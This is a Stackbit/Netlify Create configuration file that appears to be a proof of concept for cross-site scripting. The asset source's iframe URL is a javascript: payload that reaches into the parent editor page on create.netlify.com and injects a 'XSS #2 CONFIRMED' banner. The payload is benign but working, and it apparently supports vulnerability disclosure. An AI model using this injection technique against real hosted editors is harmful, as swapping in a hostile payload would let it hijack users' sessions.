import { defineStackbitConfig } from '@stackbit/types';
import { GitContentSource } from '@stackbit/cms-git';

const harmlessMarker = "javascript:(()=>{const d=parent.document;d.documentElement.setAttribute('data-netlify-create-asset-source-xss','confirmed');if(!d.getElementById('netlify-create-asset-source-xss-proof')){const b=d.createElement('div');b.id='netlify-create-asset-source-xss-proof';b.textContent='XSS #2 CONFIRMED — asset-source javascript URL modified create.netlify.com';Object.assign(b.style,{position:'fixed',top:'16px',left:'50%',transform:'translateX(-50%)',zIndex:'2147483647',padding:'13px 20px',border:'3px solid #fb7185',borderRadius:'12px',background:'#4c0519',color:'#ffe4e6',boxShadow:'0 12px 36px #0008',font:'700 15px system-ui'});d.body.appendChild(b)}return '<!doctype html><body>owned harmless marker</body>'})()";

export default defineStackbitConfig({
  stackbitVersion: '~0.6.0',
  ssgName: 'custom',
  nodeVersion: '18',
  installCommand: 'npm install',
  devCommand: 'node server.js --port {PORT} --hostname {HOSTNAME}',
  buildCommand: 'npm run build',
  publishDir: 'dist',
  contentSources: [
    new GitContentSource({
      rootPath: __dirname,
      contentDirs: ['content'],
      models: [{
        type: 'page',
        name: 'AssetSourceProof',
        label: 'Asset Source URL XSS Proof',
        urlPath: '/',
        filePath: 'content/index.json',
        fields: [
          { name: 'title', type: 'string', required: true },
          { name: 'description', type: 'text' },
          { name: 'heroImage', type: 'image', source: 'owned-asset-source' }
        ]
      }],
      assetsConfig: { referenceType: 'static', staticDir: 'assets', uploadDir: '.', publicPath: '/assets/' }
    })
  ],
  assetSources: [{
    name: 'owned-asset-source',
    type: 'iframe',
    preview: { title: 'Owned asset source proof', image: '/assets/safe.svg' },
    url: harmlessMarker
  }]
});
